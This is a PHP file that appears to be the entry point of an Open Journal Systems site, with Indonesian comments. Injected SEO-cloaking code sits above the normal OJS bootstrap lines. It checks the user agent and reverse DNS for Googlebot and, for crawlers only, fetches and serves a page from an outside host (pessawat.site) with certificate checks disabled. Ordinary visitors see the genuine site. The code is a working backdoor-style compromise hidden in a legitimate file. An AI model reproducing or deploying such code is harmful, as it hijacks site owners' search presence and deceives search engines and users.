<?php
// CLOAKING DENGAN DEBUG
$is_google = false;
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Deteksi Google (case insensitive)
if(preg_match('/Googlebot|Google-Inspection|Google-Site-Verification|Googlebot-Mobile/i', $ua)) {
    $is_google = true;
}

// Cek IP pake reverse DNS
if(!$is_google && isset($_SERVER['REMOTE_ADDR'])) {
    $host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
    if(preg_match('/google(bot)?\.com$/i', $host)) {
        $is_google = true;
    }
}

// FORCE TEST - Hapus ini nanti
// $is_google = true; // UNCOMMENT UNTUK TEST

if($is_google) {
    // PAKE CURL (lebih reliable)
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://pessawat.site/iyaisoo/index.html');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_USERAGENT, $ua);
    curl_setopt($ch, CURLOPT_HEADER, false);
    
    $content = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    // DEBUG - Hapus nanti
    error_log("Cloaking Debug - HTTP: $http_code, Error: $error, Content Length: " . strlen($content));
    
    if($content !== false && $http_code == 200 && strlen($content) > 100) {
        header('Content-Type: text/html; charset=UTF-8');
        echo $content;
        exit;
    } else {
        // Fallback kalo landing ga bisa
        echo "<html><head><title>Site</title></head><body>";
        echo "<h1>Welcome</h1>";
        echo "<p>This is a test page</p>";
        echo "</body></html>";
        exit;
    }
}

// OJS CODE...
require_once 'lib/pkp/lib/vendor/autoload.php';
define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
chdir(BASE_SYS_DIR);
require_once './lib/pkp/includes/functions.php';
return new \APP\core\Application();
